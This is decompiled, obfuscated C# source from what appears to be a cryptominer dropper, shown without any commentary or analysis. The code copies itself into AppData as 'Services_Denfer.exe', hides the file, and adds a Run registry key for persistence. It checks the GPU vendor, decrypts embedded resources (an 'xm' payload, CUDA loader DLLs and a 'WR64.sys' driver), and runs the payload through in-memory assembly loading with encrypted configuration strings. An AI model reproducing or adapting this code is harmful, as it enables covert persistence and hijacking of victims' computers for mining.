using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Management;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using ns0;
using ns2;
using ns3;

namespace ns1;

internal sealed class Class11
{
	static byte[] smethod_0(byte[] byte_0)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] result = default(byte[]);
		try
		{
			byte[] array = new byte[32];
			byte[] sourceArray = mD5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes("cyhsfwyr"));
			Array.Copy(sourceArray, 0, array, 0, 16);
			Array.Copy(sourceArray, 0, array, 15, 16);
			rijndaelManaged.Key = array;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			result = cryptoTransform.TransformFinalBlock(byte_0, 0, byte_0.Length);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	static void smethod_1()
	{
		Thread.Sleep(2000);
		try
		{
			if (Operators.CompareString(Process.GetCurrentProcess().MainModule!.FileName, Path.Combine(Interaction.Environ("AppData"), "Services_Denfer.exe"), false) == 0)
			{
				return;
			}
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (Operators.CompareString(process.MainModule!.FileName, Path.Combine(Interaction.Environ("AppData"), "Services_Denfer.exe"), false) == 0)
					{
						process.Kill();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			using (FileStream fileStream = new FileStream(Path.Combine(Interaction.Environ("AppData"), "Services_Denfer.exe"), FileMode.Create))
			{
				byte[] array = File.ReadAllBytes(Process.GetCurrentProcess().MainModule!.FileName);
				fileStream.Write(array, 0, array.Length);
			}
			if (Class5.bool_0)
			{
				try
				{
					File.SetAttributes(Path.Combine(Interaction.Environ("AppData"), "Services_Denfer.exe"), FileAttributes.Hidden | FileAttributes.System);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			Thread.Sleep(2000);
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\").SetValue(Path.GetFileName(Path.Combine(Interaction.Environ("AppData"), "Services_Denfer.exe")), Path.Combine(Interaction.Environ("AppData"), "Services_Denfer.exe"));
			Process.Start(Path.Combine(Interaction.Environ("AppData"), "Services_Denfer.exe"));
			Environment.Exit(0);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	static int smethod_2(Class16.Class19 class19_0, Class16.Class18 class18_0, int int_0)
	{
		int_0 = Math.Min(Math.Min(int_0, 32768 - class19_0.int_1), Class11.smethod_5(class18_0));
		int num = 32768 - class19_0.int_0;
		int num2;
		if (int_0 > num)
		{
			num2 = Class11.smethod_22(class18_0, class19_0.byte_0, class19_0.int_0, num);
			if (num2 == num)
			{
				num2 += Class11.smethod_22(class18_0, class19_0.byte_0, 0, int_0 - num);
			}
		}
		else
		{
			num2 = Class11.smethod_22(class18_0, class19_0.byte_0, class19_0.int_0, int_0);
		}
		class19_0.int_0 = (class19_0.int_0 + num2) & 0x7FFF;
		class19_0.int_1 += num2;
		return num2;
	}

	static string smethod_3()
	{
		return "Software\\Wow6432Node\\Red Gate\\" + Class11.smethod_13();
	}

	static string smethod_4()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0011: Expected O, but got Unknown
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		try
		{
			string text = "";
			ObjectQuery val = new ObjectQuery("SELECT * FROM Win32_VideoController");
			ManagementObjectSearcher val2 = new ManagementObjectSearcher(val);
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = val2.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)text, ((ManagementBaseObject)val3).get_Item("VideoProcessor")), (object)" "));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (!text.ToLower().Contains("nvidia") && !text.ToLower().Contains("amd"))
			{
				ManagementObjectEnumerator enumerator2 = default(ManagementObjectEnumerator);
				try
				{
					enumerator2 = val2.Get().GetEnumerator();
					while (enumerator2.MoveNext())
					{
						ManagementObject val4 = (ManagementObject)enumerator2.get_Current();
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)text, ((ManagementBaseObject)val4).get_Item("Name")), (object)" "));
					}
				}
				finally
				{
					((IDisposable)enumerator2)?.Dispose();
				}
				if (!text.ToLower().Contains("nvidia") && !text.ToLower().Contains("amd"))
				{
					return "";
				}
				return text;
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	static int smethod_5(Class16.Class18 class18_0)
	{
		return class18_0.int_1 - class18_0.int_0 + (class18_0.int_2 >> 3);
	}

	static int smethod_6(Class16.Stream0 stream0_0)
	{
		return Class11.smethod_32(stream0_0) | (Class11.smethod_32(stream0_0) << 16);
	}

	[DllImport("kernel32")]
	static extern bool MoveFileEx(string string_0, string string_1, int int_0);

	static int smethod_7(Class16.Class18 class18_0, int int_0)
	{
		if (class18_0.int_2 < int_0)
		{
			if (class18_0.int_0 == class18_0.int_1)
			{
				return -1;
			}
			class18_0.uint_0 |= (uint)(((class18_0.byte_0[class18_0.int_0++] & 0xFF) | ((class18_0.byte_0[class18_0.int_0++] & 0xFF) << 8)) << class18_0.int_2);
			class18_0.int_2 += 16;
		}
		return (int)(class18_0.uint_0 & ((1 << int_0) - 1));
	}

	static void smethod_8()
	{
		if (Versioned.IsNumeric((object)"15") && Conversions.ToInteger("15") > 0)
		{
			Thread.Sleep(checked(Conversions.ToInteger("15") * 1000));
		}
		try
		{
			byte[] buffer = Class11.smethod_17("jkbzgf");
			byte[] byte_ = new byte[0];
			byte[] array = Class11.smethod_17("enjkesiq");
			string text = Conversions.ToString(Class11.smethod_41("ciGVNZnV4jk03MVR2kYeNA=="));
			string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text;
			string text3 = "";
			try
			{
				Directory.CreateDirectory(text2);
				DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + text.Split(new char[1] { '\\' })[0]);
				try
				{
					directoryInfo.Attributes = FileAttributes.Hidden | FileAttributes.System;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				((ServerComputer)Class2.smethod_0()).get_FileSystem().WriteAllBytes(text2 + "WR64.sys", array, false);
				using (ZipArchive zipArchive = new ZipArchive(new MemoryStream(buffer)))
				{
					foreach (ZipArchiveEntry entry in zipArchive.Entries)
					{
						if (!entry.FullName.Contains("xm"))
						{
							continue;
						}
						using Stream stream = entry.Open();
						object obj = new MemoryStream();
						try
						{
							stream.CopyTo((Stream)obj);
							byte_ = (byte[])NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
						}
						finally
						{
							if (obj != null)
							{
								((IDisposable)obj).Dispose();
							}
						}
					}
				}
				string text4 = Class11.smethod_4();
				if (text4.ToLower().Contains("nvidia") || text4.ToLower().Contains("amd"))
				{
					try
					{
						byte[] buffer2 = Class11.smethod_17("yzxkkw");
						using (ZipArchive zipArchive2 = new ZipArchive(new MemoryStream(buffer2)))
						{
							foreach (ZipArchiveEntry entry2 in zipArchive2.Entries)
							{
								entry2.ExtractToFile(Path.Combine(text2, entry2.FullName), overwrite: true);
							}
						}
						if (text4.ToLower().Contains("nvidia"))
						{
							text3 = text3 + " --cuda --cuda-loader=\"" + text2 + "ddb64.dll\"";
						}
						if (text4.ToLower().Contains("amd"))
						{
							text3 += " --opencl ";
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
			Class11.smethod_36(Class11.smethod_17("qpinbfcet"), Conversions.ToString(Operators.AddObject(Class11.smethod_41("WbCIpLEGQwpCLxLbGmirEPVojj71XVOpSVfGYa3QuKRaO90bcfcgw3MeFcL03GoplOwEFUb1f05vooN/+PQVLLgD+pN00KUs9BCz7jBqoiFnwvEvju7NqUXe2/0aIN4C0DurHrHVsB8bL9emlIc2qV7mQeQ2a89+bj+IUs9KKV5ph8/HznoDQpY+S2BYFSIwnpFn29D6A2JAYOBT640dbVp1+CLdxYRzvwdtsgGTbcGYvBzk+xd++8b6TqxIQCQx1QuYACiSNV1TsJ9UPL+KCtiUM8gdG7twImSTJvI/1jZ0uHM2yzvXrc8VBPgXsaJr9zykmR/7/tGbVjEQs/ZeXlbkUVsBR+1AwydNlsCgZlJt6onJ0UptchGcTUsBWngeaj7uCOJQy8LJmA24rp1g2j54MUfCwP3csdqQKVpjR3R2Z/fjVs/IMmWay6wIf26R2ygZns3LRa7IwTdEdCLdhg=="), (object)text3)), byte_);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}

	static void smethod_9(Class16.Class19 class19_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class19_0.byte_0[class19_0.int_0++] = class19_0.byte_0[int_0++];
			class19_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static Class16.Class20 smethod_10(Class16.Class21 class21_0)
	{
		byte[] array = new byte[class21_0.int_4];
		Array.Copy(class21_0.byte_1, class21_0.int_3, array, 0, class21_0.int_4);
		return new Class16.Class20(array);
	}

	static int smethod_11(int int_0, Class16.Class19 class19_0, byte[] byte_0, int int_1)
	{
		int num = class19_0.int_0;
		if (int_1 > class19_0.int_1)
		{
			int_1 = class19_0.int_1;
		}
		else
		{
			num = (class19_0.int_0 - class19_0.int_1 + int_1) & 0x7FFF;
		}
		int num2 = int_1;
		int num3 = int_1 - num;
		if (num3 > 0)
		{
			Array.Copy(class19_0.byte_0, 32768 - num3, byte_0, int_0, num3);
			int_0 += num3;
			int_1 = num;
		}
		Array.Copy(class19_0.byte_0, num - int_1, byte_0, int_0, int_1);
		class19_0.int_1 -= num2;
		if (class19_0.int_1 < 0)
		{
			throw new InvalidOperationException();
		}
		return num2;
	}

	static byte[] smethod_12(byte[] byte_0)
	{
		Assembly callingAssembly = Assembly.GetCallingAssembly();
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		if ((object)callingAssembly != executingAssembly && !Class11.smethod_43(executingAssembly, callingAssembly))
		{
			return null;
		}
		Class16.Stream0 stream = new Class16.Stream0(byte_0);
		byte[] array = new byte[0];
		int num = Class11.smethod_6(stream);
		if (num == 67324752)
		{
			short num2 = (short)Class11.smethod_32(stream);
			int num3 = Class11.smethod_32(stream);
			int num4 = Class11.smethod_32(stream);
			if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
			{
				throw new FormatException("Wrong Header Signature");
			}
			Class11.smethod_6(stream);
			Class11.smethod_6(stream);
			Class11.smethod_6(stream);
			int num5 = Class11.smethod_6(stream);
			int num6 = Class11.smethod_32(stream);
			int num7 = Class11.smethod_32(stream);
			if (num6 > 0)
			{
				byte[] buffer = new byte[num6];
				stream.Read(buffer, 0, num6);
			}
			if (num7 > 0)
			{
				byte[] buffer2 = new byte[num7];
				stream.Read(buffer2, 0, num7);
			}
			byte[] array2 = new byte[stream.Length - stream.Position];
			stream.Read(array2, 0, array2.Length);
			Class16.Class17 @class = new Class16.Class17(array2);
			array = new byte[num5];
			Class16.Class17 class17_ = @class;
			byte[] byte_ = array;
			int int_ = array.Length;
			Class11.smethod_27(0, byte_, class17_, int_);
			array2 = null;
		}
		else
		{
			int num8 = num >> 24;
			num -= num8 << 24;
			if (num != 8223355)
			{
				throw new FormatException("Unknown Header");
			}
			if (num8 == 1)
			{
				int num9 = Class11.smethod_6(stream);
				array = new byte[num9];
				int num11;
				for (int i = 0; i < num9; i += num11)
				{
					int num10 = Class11.smethod_6(stream);
					num11 = Class11.smethod_6(stream);
					byte[] array3 = new byte[num10];
					stream.Read(array3, 0, array3.Length);
					Class11.smethod_27(i, array, new Class16.Class17(array3), num11);
				}
			}
			if (num8 == 2)
			{
				byte[] byte_2 = new byte[8] { 107, 86, 161, 182, 132, 110, 254, 55 };
				byte[] byte_3 = new byte[8] { 136, 186, 216, 109, 203, 207, 35, 115 };
				using ICryptoTransform cryptoTransform = Class11.smethod_42(bool_0: true, byte_2, byte_3);
				array = Class11.smethod_12(cryptoTransform.TransformFinalBlock(byte_0, 4, byte_0.Length - 4));
			}
			if (num8 == 3)
			{
				byte[] byte_4 = new byte[16]
				{
					1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
					1, 1, 1, 1, 1, 1
				};
				byte[] byte_5 = new byte[16]
				{
					2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
					2, 2, 2, 2, 2, 2
				};
				using ICryptoTransform cryptoTransform2 = Class11.smethod_21(byte_5, bool_0: true, byte_4);
				array = Class11.smethod_12(cryptoTransform2.TransformFinalBlock(byte_0, 4, byte_0.Length - 4));
			}
		}
		stream.Close();
		stream = null;
		return array;
	}

	static string smethod_13()
	{
		return "SmartAssembly" + " " + Class11.smethod_40();
	}

	static string smethod_14()
	{
		return "SmartAssembly";
	}

	static int smethod_15(Class16.Class19 class19_0)
	{
		return class19_0.int_1;
	}

	static void smethod_16(Class16.Class18 class18_0, int int_0)
	{
		class18_0.uint_0 >>= int_0;
		class18_0.int_2 -= int_0;
	}

	static byte[] smethod_17(string string_0)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		ResourceManager resourceManager = new ResourceManager("iadmnbuy", executingAssembly);
		return Class11.smethod_0((byte[])resourceManager.GetObject(string_0));
	}

	static void smethod_18()
	{
		try
		{
			AppDomain.CurrentDomain.AssemblyResolve += Class11.smethod_47;
		}
		catch
		{
		}
	}

	static bool smethod_19(Class16.Class17 class17_0)
	{
		switch (class17_0.int_4)
		{
		case 2:
		{
			if (class17_0.bool_0)
			{
				class17_0.int_4 = 12;
				return false;
			}
			int num = Class11.smethod_7(class17_0.class18_0, 3);
			if (num < 0)
			{
				return false;
			}
			Class11.smethod_16(class17_0.class18_0, 3);
			if (((uint)num & (true ? 1u : 0u)) != 0)
			{
				class17_0.bool_0 = true;
			}
			switch (num >> 1)
			{
			case 0:
				Class11.smethod_45(class17_0.class18_0);
				class17_0.int_4 = 3;
				break;
			case 1:
				class17_0.class20_0 = Class16.Class20.class20_0;
				class17_0.class20_1 = Class16.Class20.class20_1;
				class17_0.int_4 = 7;
				break;
			case 2:
				class17_0.class21_0 = new Class16.Class21();
				class17_0.int_4 = 6;
				break;
			}
			return true;
		}
		case 3:
			if ((class17_0.int_8 = Class11.smethod_7(class17_0.class18_0, 16)) < 0)
			{
				return false;
			}
			Class11.smethod_16(class17_0.class18_0, 16);
			class17_0.int_4 = 4;
			goto case 4;
		case 4:
			if (Class11.smethod_7(class17_0.class18_0, 16) < 0)
			{
				return false;
			}
			Class11.smethod_16(class17_0.class18_0, 16);
			class17_0.int_4 = 5;
			goto case 5;
		case 5:
		{
			int num2 = Class11.smethod_2(class17_0.class19_0, class17_0.class18_0, class17_0.int_8);
			class17_0.int_8 -= num2;
			if (class17_0.int_8 == 0)
			{
				class17_0.int_4 = 2;
				return true;
			}
			return !Class11.smethod_26(class17_0.class18_0);
		}
		case 6:
			if (!Class11.smethod_31(class17_0.class21_0, class17_0.class18_0))
			{
				return false;
			}
			class17_0.class20_0 = Class11.smethod_30(class17_0.class21_0);
			class17_0.class20_1 = Class11.smethod_10(class17_0.class21_0);
			class17_0.int_4 = 7;
			goto case 7;
		case 7:
		case 8:
		case 9:
		case 10:
			return Class11.smethod_29(class17_0);
		default:
			return false;
		case 12:
			return false;
		}
	}

	static void smethod_20(Class16.Class20 class20_0, byte[] byte_0)
	{
		int[] array = new int[16];
		int[] array2 = new int[16];
		foreach (int num in byte_0)
		{
			if (num > 0)
			{
				array[num]++;
			}
		}
		int num2 = 0;
		int num3 = 512;
		for (int j = 1; j <= 15; j++)
		{
			array2[j] = num2;
			num2 += array[j] << 16 - j;
			if (j >= 10)
			{
				int num4 = array2[j] & 0x1FF80;
				int num5 = num2 & 0x1FF80;
				num3 += num5 - num4 >> 16 - j;
			}
		}
		class20_0.short_0 = new short[num3];
		int num6 = 512;
		for (int num7 = 15; num7 >= 10; num7--)
		{
			int num8 = num2 & 0x1FF80;
			num2 -= array[num7] << 16 - num7;
			for (int k = num2 & 0x1FF80; k < num8; k += 128)
			{
				class20_0.short_0[Class11.smethod_44(k)] = (short)((-num6 << 4) | num7);
				num6 += 1 << num7 - 9;
			}
		}
		for (int l = 0; l < byte_0.Length; l++)
		{
			int num9 = byte_0[l];
			if (num9 == 0)
			{
				continue;
			}
			num2 = array2[num9];
			int num10 = Class11.smethod_44(num2);
			if (num9 <= 9)
			{
				do
				{
					class20_0.short_0[num10] = (short)((l << 4) | num9);
					num10 += 1 << num9;
				}
				while (num10 < 512);
			}
			else
			{
				int num11 = class20_0.short_0[num10 & 0x1FF];
				int num12 = 1 << (num11 & 0xF);
				num11 = -(num11 >> 4);
				do
				{
					class20_0.short_0[num11 | (num10 >> 9)] = (short)((l << 4) | num9);
					num10 += 1 << num9;
				}
				while (num10 < num12);
			}
			array2[num9] = num2 + (1 << 16 - num9);
		}
	}

	static ICryptoTransform smethod_21(byte[] byte_0, bool bool_0, byte[] byte_1)
	{
		using SymmetricAlgorithm symmetricAlgorithm = new RijndaelManaged();
		return bool_0 ? symmetricAlgorithm.CreateDecryptor(byte_1, byte_0) : symmetricAlgorithm.CreateEncryptor(byte_1, byte_0);
	}

	static int smethod_22(Class16.Class18 class18_0, byte[] byte_0, int int_0, int int_1)
	{
		int num = 0;
		while (class18_0.int_2 > 0 && int_1 > 0)
		{
			byte_0[int_0++] = (byte)class18_0.uint_0;
			class18_0.uint_0 >>= 8;
			class18_0.int_2 -= 8;
			int_1--;
			num++;
		}
		if (int_1 == 0)
		{
			return num;
		}
		int num2 = class18_0.int_1 - class18_0.int_0;
		if (int_1 > num2)
		{
			int_1 = num2;
		}
		Array.Copy(class18_0.byte_0, class18_0.int_0, byte_0, int_0, int_1);
		class18_0.int_0 += int_1;
		if (((uint)(class18_0.int_0 - class18_0.int_1) & (true ? 1u : 0u)) != 0)
		{
			class18_0.uint_0 = class18_0.byte_0[class18_0.int_0++] & 0xFFu;
			class18_0.int_2 = 8;
		}
		return num + int_1;
	}

	static void smethod_23(Class16.Class19 class19_0, int int_0, int int_1)
	{
		if ((class19_0.int_1 += int_0) > 32768)
		{
			throw new InvalidOperationException();
		}
		int num = (class19_0.int_0 - int_1) & 0x7FFF;
		int num2 = 32768 - int_0;
		if (num <= num2 && class19_0.int_0 < num2)
		{
			if (int_0 <= int_1)
			{
				Array.Copy(class19_0.byte_0, num, class19_0.byte_0, class19_0.int_0, int_0);
				class19_0.int_0 += int_0;
			}
			else
			{
				while (int_0-- > 0)
				{
					class19_0.byte_0[class19_0.int_0++] = class19_0.byte_0[num++];
				}
			}
		}
		else
		{
			Class11.smethod_9(class19_0, num, int_0, int_1);
		}
	}

	static string smethod_24()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class11.smethod_46());
			if (registryKey == null)
			{
				registryKey = Registry.LocalMachine.OpenSubKey(Class11.smethod_3());
			}
			if (registryKey == null)
			{
				return null;
			}
			string result = (string)registryKey.GetValue("Path", null);
			registryKey.Close();
			return result;
		}
		catch
		{
			return null;
		}
	}

	static void smethod_25()
	{
		try
		{
			Class11.smethod_18();
		}
		catch (Exception)
		{
		}
	}

	static bool smethod_26(Class16.Class18 class18_0)
	{
		return class18_0.int_0 == class18_0.int_1;
	}

	static int smethod_27(int int_0, byte[] byte_0, Class16.Class17 class17_0, int int_1)
	{
		int num = 0;
		do
		{
			if (class17_0.int_4 != 11)
			{
				int num2 = Class11.smethod_11(int_0, class17_0.class19_0, byte_0, int_1);
				int_0 += num2;
				num += num2;
				int_1 -= num2;
				if (int_1 == 0)
				{
					return num;
				}
			}
		}
		while (Class11.smethod_19(class17_0) || (class17_0.class19_0.int_1 > 0 && class17_0.int_4 != 11));
		return num;
	}

	static void smethod_28(byte[] byte_0, Class16.Class18 class18_0, int int_0, int int_1)
	{
		if (class18_0.int_0 < class18_0.int_1)
		{
			throw new InvalidOperationException();
		}
		int num = int_1 + int_0;
		if (0 <= int_1 && int_1 <= num && num <= byte_0.Length)
		{
			if (((uint)int_0 & (true ? 1u : 0u)) != 0)
			{
				class18_0.uint_0 |= (uint)((byte_0[int_1++] & 0xFF) << class18_0.int_2);
				class18_0.int_2 += 8;
			}
			class18_0.byte_0 = byte_0;
			class18_0.int_0 = int_1;
			class18_0.int_1 = num;
			return;
		}
		throw new ArgumentOutOfRangeException();
	}

	static bool smethod_29(Class16.Class17 class17_0)
	{
		int num = Class11.smethod_38(class17_0.class19_0);
		while (num >= 258)
		{
			switch (class17_0.int_4)
			{
			case 7:
			{
				int num2;
				while (((num2 = Class11.smethod_37(class17_0.class20_0, class17_0.class18_0)) & -256) == 0)
				{
					Class11.smethod_33(class17_0.class19_0, num2);
					if (--num < 258)
					{
						return true;
					}
				}
				if (num2 >= 257)
				{
					class17_0.int_6 = Class16.Class17.int_0[num2 - 257];
					class17_0.int_5 = Class16.Class17.int_1[num2 - 257];
					goto case 8;
				}
				if (num2 < 0)
				{
					return false;
				}
				class17_0.class20_1 = null;
				class17_0.class20_0 = null;
				class17_0.int_4 = 2;
				return true;
			}
			case 8:
				if (class17_0.int_5 > 0)
				{
					class17_0.int_4 = 8;
					int num4 = Class11.smethod_7(class17_0.class18_0, class17_0.int_5);
					if (num4 < 0)
					{
						return false;
					}
					Class11.smethod_16(class17_0.class18_0, class17_0.int_5);
					class17_0.int_6 += num4;
				}
				class17_0.int_4 = 9;
				goto case 9;
			case 9:
			{
				int num2 = Class11.smethod_37(class17_0.class20_1, class17_0.class18_0);
				if (num2 >= 0)
				{
					class17_0.int_7 = Class16.Class17.int_2[num2];
					class17_0.int_5 = Class16.Class17.int_3[num2];
					goto case 10;
				}
				return false;
			}
			case 10:
				if (class17_0.int_5 > 0)
				{
					class17_0.int_4 = 10;
					int num3 = Class11.smethod_7(class17_0.class18_0, class17_0.int_5);
					if (num3 < 0)
					{
						return false;
					}
					Class11.smethod_16(class17_0.class18_0, class17_0.int_5);
					class17_0.int_7 += num3;
				}
				Class11.smethod_23(class17_0.class19_0, class17_0.int_6, class17_0.int_7);
				num -= class17_0.int_6;
				class17_0.int_4 = 7;
				break;
			}
		}
		return true;
	}

	static Class16.Class20 smethod_30(Class16.Class21 class21_0)
	{
		byte[] array = new byte[class21_0.int_3];
		Array.Copy(class21_0.byte_1, 0, array, 0, class21_0.int_3);
		return new Class16.Class20(array);
	}

	static bool smethod_31(Class16.Class21 class21_0, Class16.Class18 class18_0)
	{
		while (true)
		{
			switch (class21_0.int_2)
			{
			case 5:
			{
				int int_ = Class16.Class21.int_1[class21_0.int_7];
				int num = Class11.smethod_7(class18_0, int_);
				if (num >= 0)
				{
					Class11.smethod_16(class18_0, int_);
					num += Class16.Class21.int_0[class21_0.int_7];
					while (num-- > 0)
					{
						class21_0.byte_1[class21_0.int_8++] = class21_0.byte_2;
					}
					if (class21_0.int_8 == class21_0.int_6)
					{
						return true;
					}
					goto IL_00a0;
				}
				return false;
			}
			case 4:
			{
				int num2;
				while (((num2 = Class11.smethod_37(class21_0.class20_0, class18_0)) & -16) == 0)
				{
					class21_0.byte_1[class21_0.int_8++] = (class21_0.byte_2 = (byte)num2);
					if (class21_0.int_8 == class21_0.int_6)
					{
						return true;
					}
				}
				if (num2 >= 0)
				{
					if (num2 >= 17)
					{
						class21_0.byte_2 = 0;
					}
					class21_0.int_7 = num2 - 16;
					class21_0.int_2 = 5;
					goto case 5;
				}
				return false;
			}
			case 3:
				while (class21_0.int_8 < class21_0.int_5)
				{
					int num3 = Class11.smethod_7(class18_0, 3);
					if (num3 >= 0)
					{
						Class11.smethod_16(class18_0, 3);
						class21_0.byte_0[Class16.Class21.int_9[class21_0.int_8]] = (byte)num3;
						class21_0.int_8++;
						continue;
					}
					return false;
				}
				class21_0.class20_0 = new Class16.Class20(class21_0.byte_0);
				class21_0.byte_0 = null;
				class21_0.int_8 = 0;
				class21_0.int_2 = 4;
				goto case 4;
			case 2:
				class21_0.int_5 = Class11.smethod_7(class18_0, 4);
				if (class21_0.int_5 >= 0)
				{
					class21_0.int_5 += 4;
					Class11.smethod_16(class18_0, 4);
					class21_0.byte_0 = new byte[19];
					class21_0.int_8 = 0;
					class21_0.int_2 = 3;
					goto case 3;
				}
				return false;
			case 1:
				class21_0.int_4 = Class11.smethod_7(class18_0, 5);
				if (class21_0.int_4 >= 0)
				{
					class21_0.int_4++;
					Class11.smethod_16(class18_0, 5);
					class21_0.int_6 = class21_0.int_3 + class21_0.int_4;
					class21_0.byte_1 = new byte[class21_0.int_6];
					class21_0.int_2 = 2;
					goto case 2;
				}
				return false;
			case 0:
				class21_0.int_3 = Class11.smethod_7(class18_0, 5);
				if (class21_0.int_3 >= 0)
				{
					class21_0.int_3 += 257;
					Class11.smethod_16(class18_0, 5);
					class21_0.int_2 = 1;
					goto case 1;
				}
				return false;
			}
			continue;
			IL_00a0:
			class21_0.int_2 = 4;
		}
	}

	static int smethod_32(Class16.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static void smethod_33(Class16.Class19 class19_0, int int_0)
	{
		if (class19_0.int_1++ == 32768)
		{
			throw new InvalidOperationException();
		}
		class19_0.byte_0[class19_0.int_0++] = (byte)int_0;
		class19_0.int_0 &= 32767;
	}

	static int smethod_34(Class16.Class18 class18_0)
	{
		return class18_0.int_2;
	}

	static void smethod_35()
	{
		try
		{
			Class10.smethod_0();
		}
		catch (Exception)
		{
		}
	}

	static void smethod_36(byte[] byte_0, string string_0, byte[] byte_1)
	{
		try
		{
			Assembly.Load(byte_0).GetType("Project1.Program")!.GetMethod("Load", BindingFlags.Static | BindingFlags.Public)!.Invoke(null, new object[3]
			{
				byte_1,
				Operators.ConcatenateObject(Operators.ConcatenateObject(Class11.smethod_41("ht1Aztl27Fr92WegMmLOuw=="), (object)"\\"), Class11.smethod_41("Dgt/9RU8K0/UR2Wohqa4EA==")),
				string_0
			});
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	static int smethod_37(Class16.Class20 class20_0, Class16.Class18 class18_0)
	{
		int num;
		int num2;
		if ((num = Class11.smethod_7(class18_0, 9)) >= 0)
		{
			if ((num2 = class20_0.short_0[num]) >= 0)
			{
				Class11.smethod_16(class18_0, num2 & 0xF);
				return num2 >> 4;
			}
			int num3 = -(num2 >> 4);
			int int_ = num2 & 0xF;
			if ((num = Class11.smethod_7(class18_0, int_)) >= 0)
			{
				num2 = class20_0.short_0[num3 | (num >> 9)];
				Class11.smethod_16(class18_0, num2 & 0xF);
				return num2 >> 4;
			}
			int int_2 = class18_0.int_2;
			num = Class11.smethod_7(class18_0, int_2);
			num2 = class20_0.short_0[num3 | (num >> 9)];
			if ((num2 & 0xF) <= int_2)
			{
				Class11.smethod_16(class18_0, num2 & 0xF);
				return num2 >> 4;
			}
			return -1;
		}
		int int_3 = class18_0.int_2;
		num = Class11.smethod_7(class18_0, int_3);
		num2 = class20_0.short_0[num];
		if (num2 >= 0 && (num2 & 0xF) <= int_3)
		{
			Class11.smethod_16(class18_0, num2 & 0xF);
			return num2 >> 4;
		}
		return -1;
	}

	static int smethod_38(Class16.Class19 class19_0)
	{
		return 32768 - class19_0.int_1;
	}

	static bool smethod_39()
	{
		return Class8.smethod_0();
	}

	static int smethod_40()
	{
		return Class12.version_0.Major;
	}

	static object smethod_41(string string_0)
	{
		return Encoding.ASCII.GetString(Class11.smethod_0(Convert.FromBase64String(string_0)));
	}

	static ICryptoTransform smethod_42(bool bool_0, byte[] byte_0, byte[] byte_1)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_0, byte_1) : dESCryptoServiceProvider.CreateEncryptor(byte_0, byte_1);
	}

	static bool smethod_43(Assembly assembly_0, Assembly assembly_1)
	{
		return true;
	}

	static short smethod_44(int int_0)
	{
		return (short)((Class16.Class22.byte_0[int_0 & 0xF] << 12) | (Class16.Class22.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class16.Class22.byte_0[(int_0 >> 8) & 0xF] << 4) | Class16.Class22.byte_0[int_0 >> 12]);
	}

	static void smethod_45(Class16.Class18 class18_0)
	{
		class18_0.uint_0 >>= class18_0.int_2 & 7;
		class18_0.int_2 &= -8;
	}

